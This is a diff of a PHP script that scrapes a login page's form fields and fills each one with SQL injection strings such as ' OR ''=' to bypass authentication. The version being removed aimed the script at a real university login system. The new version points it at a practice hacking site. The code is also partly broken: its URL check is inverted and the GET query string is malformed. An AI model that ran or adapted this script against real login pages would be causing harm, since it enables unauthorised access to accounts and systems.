@@ -2,7 +2,7 @@
     include_once('./simple_html_dom.php');
 
     // URL to GET
-    $url = 'https://sistemas.cp.utfpr.edu.br/slogin/';
+    $url = 'https://sqlzoo.net/hack/';
     // DOM a partir da URL
     $html = file_get_html($url);
 
@@ -20,29 +20,56 @@
         array_push($inputs, $input);
     }
 
-    postRequest();
+    getRequest();
 
     #endsection
 
     function postRequest() {
-        global $inputs, $url;
+        global $inputs, $url, $forms;
 
         $data = array();
         foreach($inputs as $input) {
-            $data[$input->id] = 'or 1=1';
+            $data[$input->name] = "' OR ''='";
         }
-        
-        $curl = curl_init($url);
+
+        if (strpos($url, 'http')) {
+            $curl = curl_init($url);
+        } else {
+            $curl = curl_init($url . $forms[0]->action);
+        }
         curl_setopt($curl, CURLOPT_POST, true);
         curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($data));
         curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
         $response = curl_exec($curl);
         curl_close($curl);
-        echo $response;
-
+        var_dump($response);
     }
 
-        // Finaliza execução 
-        die();
+    function getRequest() {
+        global $url, $forms, $inputs;
 
-?>
+        $urlGet = $url . '/passwd.pl?';
+        $sqlStr = '"OR 1=1"';
+
+        foreach($inputs as $input) {
+            echo $input->name;
+            echo $input;
+            $urlGet .= $input->name;
+            $urlGet .= $sqlStr;
+        }
+
+        //Once again, we use file_get_contents to GET the URL in question.
+        $contents = file_get_contents($urlGet);
+        
+        //If $contents is not a boolean FALSE value.
+        if($contents !== false){
+            //Print out the contents.
+            echo 'ERRO';
+            echo $contents;
+            die();
+        }
+
+        echo 'OPA';
+    }
+    // Finaliza execução 
+    die();
